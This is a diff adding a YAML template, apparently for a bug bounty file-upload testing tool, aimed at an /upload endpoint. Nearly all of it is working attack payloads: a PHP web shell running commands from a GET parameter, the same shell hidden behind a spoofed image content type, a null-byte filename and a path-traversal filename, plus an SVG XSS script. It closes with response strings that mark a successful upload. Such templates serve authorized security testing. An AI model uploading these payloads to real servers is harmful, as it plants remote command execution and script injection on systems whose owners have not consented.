@@ -1,0 +1,66 @@
+name: "Bug Bounty Generic Upload"
+description: "General-purpose template for bug bounty file upload testing"
+author: "@HaakimSec"
+version: "1.0"
+tech_stack: "all"
+
+target:
+  endpoint: "/upload"
+  method: "POST"
+  param: "file"
+
+headers:
+  Bug-Bounty: "researcher@example.com"
+
+payloads:
+  - name: "PHP webshell"
+    filename: "test.php"
+    extension: ".php"
+    content_type: "image/jpeg"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["php", "webshell"]
+
+  - name: "SVG XSS"
+    filename: "xss.svg"
+    extension: ".svg"
+    content_type: "image/svg+xml"
+    body: |
+      <?xml version="1.0"?>
+      <svg xmlns="http://www.w3.org/2000/svg">
+        <script>alert(document.domain)</script>
+      </svg>
+    tags: ["svg", "xss"]
+
+  - name: "HTML injection"
+    filename: "test.html"
+    extension: ".html"
+    body: |
+      <html><body><h1>Bug Bounty POC</h1></body></html>
+    tags: ["html", "injection"]
+
+  - name: "Null byte bypass"
+    filename: "test.php%00.jpg"
+    extension: ".jpg"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["null-byte", "bypass"]
+
+  - name: "Path traversal"
+    filename: "../../../test.php"
+    extension: ".php"
+    body: |
+      <?php system($_GET['cmd']); ?>
+    tags: ["path-traversal"]
+
+success_indicators:
+  - "success"
+  - "uploaded"
+  - "200 OK"
+  - "201 Created"
+
+failure_indicators:
+  - "not allowed"
+  - "invalid"
+  - "error"
+  - "blocked"
